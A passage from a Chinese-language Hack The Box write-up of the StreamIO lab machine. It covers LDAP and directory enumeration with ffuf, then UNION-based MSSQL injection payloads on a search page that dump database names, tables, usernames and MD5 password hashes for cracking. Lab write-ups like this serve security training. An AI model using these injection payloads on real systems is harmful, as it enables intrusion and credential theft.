class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.970</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1338</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.474</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1339</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1340</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1413</span><br>supportedControl: <span class="hljs-number">2.16</span><span class="hljs-number">.840</span><span class="hljs-number">.1</span><span class="hljs-number">.113730</span><span class="hljs-number">.3</span><span class="hljs-number">.4</span><span class="hljs-number">.9</span><br>supportedControl: <span class="hljs-number">2.16</span><span class="hljs-number">.840</span><span class="hljs-number">.1</span><span class="hljs-number">.113730</span><span class="hljs-number">.3</span><span class="hljs-number">.4</span><span class="hljs-number">.10</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1504</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1852</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.802</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1907</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1948</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1974</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1341</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.2026</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.2064</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.2065</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.2066</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.2090</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.2205</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.2204</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.2206</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.2211</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.2239</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.2255</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.2256</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.2309</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.2330</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.2354</span><br>supportedCapabilities: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.800</span><br>supportedCapabilities: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1670</span><br>supportedCapabilities: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1791</span><br>supportedCapabilities: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1935</span><br>supportedCapabilities: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.2080</span><br>supportedCapabilities: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.2237</span><br>subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=streamIO,DC=htb<br>serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configurat<br> ion,DC=streamIO,DC=htb<br>schemaNamingContext: CN=Schema,CN=Configuration,DC=streamIO,DC=htb<br>namingContexts: DC=streamIO,DC=htb<br>namingContexts: CN=Configuration,DC=streamIO,DC=htb<br>namingContexts: CN=Schema,CN=Configuration,DC=streamIO,DC=htb<br>namingContexts: DC=DomainDnsZones,DC=streamIO,DC=htb<br>namingContexts: DC=ForestDnsZones,DC=streamIO,DC=htb<br>isSynchronized: TRUE<br>highestCommittedUSN: <span class="hljs-number">143475</span><br>dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN<br> =Sites,CN=Configuration,DC=streamIO,DC=htb<br>dnsHostName: DC.streamIO.htb<br>defaultNamingContext: DC=streamIO,DC=htb<br>currentTime: <span class="hljs-number">20240410214540.0</span>Z<br>configurationNamingContext: CN=Configuration,DC=streamIO,DC=htb<br><br><span class="hljs-meta"># search result</span><br>search: <span class="hljs-number">2</span><br>result: <span class="hljs-number">0</span> Success<br><br># numResponses: <span class="hljs-number">2</span><br># numEntries: <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p>4、接下来还是先绑定下本地hosts信息吧</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ echo <span class="hljs-string">&quot;10.10.11.158 watch.streamIO.htb streamIO.htb DomainDnsZones.streamIO.htb ForestDnsZones.streamIO.htb DC.streamIO.htb&quot;</span> | sudo tee -a /etc/hosts<br>[sudo] kali 的密码：<br><span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span> watch.streamIO.htb streamIO.htb DomainDnsZones.streamIO.htb ForestDnsZones.streamIO.htb DC.streamIO.htb<br></code></pre></td></tr></table></figure>

<p>5、剩下的就是查看下WEB端口服务的内容了</p>
<p><code>http://10.10.11.158/</code></p>
<p><img src="http://sh1yan.top/photo/StreamIO-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
<p><code>https://10.10.11.158/</code></p>
<p><img src="http://sh1yan.top/photo/StreamIO-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
<p><code>https://streamio.htb/</code></p>
<p><img src="http://sh1yan.top/photo/StreamIO-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
<p><code>https://watch.streamio.htb/</code></p>
<p><img src="http://sh1yan.top/photo/StreamIO-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
<p>6、其实枚举到这个WEB端口的情况，我就知道这个靶机不是好打的，毕竟开放的端口多，WEB服务也多，说明兔子洞也多，先查看下网站是什么语言，再决定如何扫描靶机</p>
<p><img src="http://sh1yan.top/photo/StreamIO-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
<p>7、扫描下目录文件情况吧</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ ffuf -u https:<span class="hljs-comment">//watch.streamio.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -e .php</span><br><br>        /<span class="hljs-string">&#x27;___\  /&#x27;</span>___\           /<span class="hljs-string">&#x27;___\       </span><br><span class="hljs-string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="hljs-string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="hljs-string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="hljs-string">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="hljs-string">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="hljs-string"></span><br><span class="hljs-string">       v2.1.0-dev</span><br><span class="hljs-string">________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string"> :: Method           : GET</span><br><span class="hljs-string"> :: URL              : https://watch.streamio.htb/FUZZ</span><br><span class="hljs-string"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt</span><br><span class="hljs-string"> :: Extensions       : .php </span><br><span class="hljs-string"> :: Follow redirects : false</span><br><span class="hljs-string"> :: Calibration      : false</span><br><span class="hljs-string"> :: Timeout          : 10</span><br><span class="hljs-string"> :: Threads          : 40</span><br><span class="hljs-string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span><br><span class="hljs-string">________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string">search.php              [Status: 200, Size: 253887, Words: 12366, Lines: 7194, Duration: 166ms]</span><br><span class="hljs-string">static                  [Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 106ms]</span><br><span class="hljs-string">Search.php              [Status: 200, Size: 253887, Words: 12366, Lines: 7194, Duration: 143ms]</span><br><span class="hljs-string">Index.php               [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 106ms]</span><br><span class="hljs-string">INDEX.php               [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 130ms]</span><br><span class="hljs-string">SEARCH.php              [Status: 200, Size: 253887, Words: 12366, Lines: 7194, Duration: 112ms]</span><br><span class="hljs-string">blocked.php             [Status: 200, Size: 677, Words: 28, Lines: 20, Duration: 109ms]</span><br><span class="hljs-string">Static                  [Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 110ms]</span><br><span class="hljs-string">                        [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 108ms]</span><br><span class="hljs-string">:: Progress: [175328/175328] :: Job [1/1] :: 141 req/sec :: Duration: [0:13:59] :: Errors: 0 ::</span><br></code></pre></td></tr></table></figure>

<p><code>https://watch.streamio.htb/search.php</code></p>
<p><img src="http://sh1yan.top/photo/StreamIO-htb-writeup/6.png" srcset="/img/loading.gif" lazyload></p>
<p><code>https://watch.streamio.htb/blocked.php</code></p>
<p><img src="http://sh1yan.top/photo/StreamIO-htb-writeup/8.png" srcset="/img/loading.gif" lazyload></p>
<p>8、继续扫主域名的目录</p>
<p><img src="http://sh1yan.top/photo/StreamIO-htb-writeup/7.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ ffuf -u https:<span class="hljs-comment">//streamio.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -e .php</span><br><br>        /<span class="hljs-string">&#x27;___\  /&#x27;</span>___\           /<span class="hljs-string">&#x27;___\       </span><br><span class="hljs-string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="hljs-string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="hljs-string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="hljs-string">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="hljs-string">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="hljs-string"></span><br><span class="hljs-string">       v2.1.0-dev</span><br><span class="hljs-string">________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string"> :: Method           : GET</span><br><span class="hljs-string"> :: URL              : https://streamio.htb/FUZZ</span><br><span class="hljs-string"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt</span><br><span class="hljs-string"> :: Extensions       : .php </span><br><span class="hljs-string"> :: Follow redirects : false</span><br><span class="hljs-string"> :: Calibration      : false</span><br><span class="hljs-string"> :: Timeout          : 10</span><br><span class="hljs-string"> :: Threads          : 40</span><br><span class="hljs-string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span><br><span class="hljs-string">________________________________________________</span><br><span class="hljs-string">login.php               [Status: 200, Size: 4145, Words: 796, Lines: 111, Duration: 124ms]</span><br><span class="hljs-string">register.php            [Status: 200, Size: 4500, Words: 905, Lines: 121, Duration: 116ms]</span><br><span class="hljs-string">Images                  [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 447ms]</span><br><span class="hljs-string">admin                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 455ms]</span><br><span class="hljs-string">css                     [Status: 301, Size: 148, Words: 9, Lines: 2, Duration: 103ms]</span><br><span class="hljs-string">Contact.php             [Status: 200, Size: 6434, Words: 2010, Lines: 206, Duration: 120ms]</span><br><span class="hljs-string">About.php               [Status: 200, Size: 7825, Words: 2228, Lines: 231, Duration: 119ms]</span><br><span class="hljs-string">Index.php               [Status: 200, Size: 13497, Words: 5027, Lines: 395, Duration: 112ms]</span><br><span class="hljs-string">Login.php               [Status: 200, Size: 4145, Words: 796, Lines: 111, Duration: 117ms]</span><br><span class="hljs-string">js                      [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 106ms]</span><br><span class="hljs-string">logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 114ms]</span><br><span class="hljs-string">Register.php            [Status: 200, Size: 4500, Words: 905, Lines: 121, Duration: 113ms]</span><br><span class="hljs-string">fonts                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 116ms]</span><br><span class="hljs-string">IMAGES                  [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 424ms]</span><br><span class="hljs-string">INDEX.php               [Status: 200, Size: 13497, Words: 5027, Lines: 395, Duration: 114ms]</span><br><span class="hljs-string">Fonts                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 108ms]</span><br><span class="hljs-string">Admin                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 116ms]</span><br><span class="hljs-string">CSS                     [Status: 301, Size: 148, Words: 9, Lines: 2, Duration: 429ms]</span><br><span class="hljs-string">JS                      [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 122ms]</span><br><span class="hljs-string">Logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 135ms]</span><br><span class="hljs-string">CONTACT.php             [Status: 200, Size: 6434, Words: 2010, Lines: 206, Duration: 160ms]</span><br><span class="hljs-string">                        [Status: 200, Size: 13497, Words: 5027, Lines: 395, Duration: 448ms]</span><br><span class="hljs-string">ABOUT.php               [Status: 200, Size: 7825, Words: 2228, Lines: 231, Duration: 110ms]</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>

<p><code>https://streamio.htb/Register.php</code></p>
<p><img src="http://sh1yan.top/photo/StreamIO-htb-writeup/9.png" srcset="/img/loading.gif" lazyload></p>
<p><code>shiyan</code><br><code>shiyan</code></p>
<p><code>https://streamio.htb/admin/master.php</code></p>
<p><img src="http://sh1yan.top/photo/StreamIO-htb-writeup/10.png" srcset="/img/loading.gif" lazyload></p>
<p>9、截止到目前的信息，最先的突破口，估计就是那个电影的搜索目录了，最容易出现SQL注入漏洞，简单尝试下吧</p>
<p><code>https://watch.streamio.htb/search.php</code></p>
<p><code>1&#39; AND 1=1 -- //</code></p>
<p><img src="http://sh1yan.top/photo/StreamIO-htb-writeup/11.png" srcset="/img/loading.gif" lazyload></p>
<p><code>1&#39; AND 1=2 -- //</code></p>
<p><img src="http://sh1yan.top/photo/StreamIO-htb-writeup/12.png" srcset="/img/loading.gif" lazyload></p>
<p>10、到这里基本上就是存在SQL注入漏洞了，下面开始枚举出来一些数据</p>
<p><code>q=-1&#39; union select 1,2,3,4 ,5,6  -- //</code></p>
<p><img src="http://sh1yan.top/photo/StreamIO-htb-writeup/13.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs c">q=<span class="hljs-number">-1&#x27;</span> <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,@@version,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> ,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>  -- <span class="hljs-comment">//</span><br><br>Microsoft SQL Server <span class="hljs-number">2019</span> (RTM) - <span class="hljs-number">15.0</span><span class="hljs-number">.2000</span><span class="hljs-number">.5</span> (X64) <br>Sep <span class="hljs-number">24</span> <span class="hljs-number">2019</span> <span class="hljs-number">13</span>:<span class="hljs-number">48</span>:<span class="hljs-number">23</span> <br>Copyright (C) <span class="hljs-number">2019</span> Microsoft Corporation<br>Express Edition (<span class="hljs-number">64</span>-bit) on Windows Server <span class="hljs-number">2019</span> Standard <span class="hljs-number">10.0</span> &lt;X64&gt; (Build <span class="hljs-number">17763</span>: ) (Hypervisor)<br><br>q=<span class="hljs-number">-1&#x27;</span> <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,(select User_Name()),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> ,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>  -- <span class="hljs-comment">//</span><br><br>db_user<br><br>q=<span class="hljs-number">-1&#x27;</span> <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,(select host_name()),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> ,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>  -- <span class="hljs-comment">//</span><br><br>DC<br><br>q=<span class="hljs-number">-1&#x27;</span> <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,name,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> ,<span class="hljs-number">5</span>,<span class="hljs-number">6</span> from sys.databases  -- <span class="hljs-comment">//</span><br><br>master<br>model<br>msdb<br>STREAMIO<br>streamio_backup<br>tempdb<br><br><span class="hljs-number">-1&#x27;</span> <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,name,id,<span class="hljs-number">4</span> ,<span class="hljs-number">5</span>,<span class="hljs-number">6</span> from STREAMIO.dbo.sysobjects where xtype=<span class="hljs-string">&#x27;U&#x27;</span>  -- <span class="hljs-comment">//</span><br><br>movies<br><span class="hljs-number">885578193</span><br>users<br><span class="hljs-number">901578250</span><br><br><br><span class="hljs-number">-1&#x27;</span> <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,name,id,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span> from STREAMIO.dbo.syscolumns where id=<span class="hljs-string">&#x27;901578250&#x27;</span>  -- <span class="hljs-comment">//</span><br><br>id<br><span class="hljs-number">901578250</span><br>is_staff<br><span class="hljs-number">901578250</span><br>password<br><span class="hljs-number">901578250</span><br>username<br><span class="hljs-number">901578250</span><br><br><span class="hljs-number">-1&#x27;</span> <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,username,password,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span> from users -- <span class="hljs-comment">//</span><br><br>这里发现查不出来，但是命令都是对的，估计是字段限制吧，那就转变一下<br><br><span class="hljs-number">-1&#x27;</span> <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,username,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span> from users -- <span class="hljs-comment">//</span><br><br>admin<br>Alexendra<br>Austin<br>Barbra<br>Barry<br>Baxter<br>Bruno<br>Carmon<br>Clara<br>Diablo<br>Garfield<br>Gloria<br>James<br>Juliette<br>Lauren<br>Lenord<br>Lucifer<br>Michelle<br>Oliver<br>Robert<br>Robin<br>Sabrina<br>Samantha<br>Stan<br>Thane<br>Theodore<br>Victor<br>Victoria<br>William<br>yoshihide<br><br><br><span class="hljs-number">-1&#x27;</span> <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,password,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span> from users -- <span class="hljs-comment">//</span><br><br><span class="hljs-number">0049</span>ac57646627b8d7aeaccf8b6a936f<br><span class="hljs-number">08344b</span>85b329d7efd611b7a7743e8a09<br><span class="hljs-number">083f</span>fae904143c4796e464dac33c1f7d<br><span class="hljs-number">0</span>cfaaaafb559f081df2befbe66686de0<br><span class="hljs-number">1</span>c2b3d8270321140e5153f6637d3ee53<br><span class="hljs-number">22</span>ee218331afd081b0dcd8115284bae3<br><span class="hljs-number">2</span>a4e2cf22dd8fcb45adcb91be1e22ae8<br><span class="hljs-number">35394484</span>d89fcfdb3c5e447fe749d213<br><span class="hljs-number">3577</span>c47eb1e12c8ba021611e1280753c<br><span class="hljs-number">384463526</span>d288edcc95fc3701e523bc7<br><span class="hljs-number">3961548825e3</span>e21df5646cafe11c6c76<br><span class="hljs-number">54</span>c88b2dbd7b1a84012fabc1a4c73415<br><span class="hljs-number">665</span>a50ac9eaa781e4f7f04199db97a11<br><span class="hljs-number">6</span>dcd87740abb64edfa36d170f0d5450d<br><span class="hljs-number">7</span>df45a9e3de3863807c026ba48e55fb3<br><span class="hljs-number">8097</span>cedd612cc37c29db152b6e9edbd3<br><span class="hljs-number">925e5408</span>ecb67aea449373d668b7359e<br>b22abb47a02b52d5dfa27fb0b534f693<br>b779ba15cedfd22a023c4d8bcf5f2332<br>b83439b16f844bd6ffe35c02fe21b3c0<br><br><br>bf55e15b119860a6e6b5a164377da719<br>c660060492d9edcaa8332d89c99c9239<br>d62be0dc82071bccc1322d64ec5b6c51<br>dc332fb5576e9631c9dae83f194f8e70<br>ec33265e5fc8c2f1b0c137bb7b3632b5<br>ee0b8a0937abd60c2882eacb2f8dc49f<br>ef8f3d30a856cf166fb8215aca93e9ff<br>f03b910e2bd0313a23fdd7575f34a694<br>f87d3c0d6c8fd686aacc6627f1f493a5<br>fd78db29173a5cf701bd69027cb9bf6b<br></code></pre></td></tr></table></figure>

<p>11、到这里就发现了一些账号密码，那就使用在线的破解网站进行密码破解把，这样快些</p>
<p><img src="http://sh1yan.top/photo/StreamIO-htb-writeup/14.png" srcset="/img/loading.gif" lazyload></p>
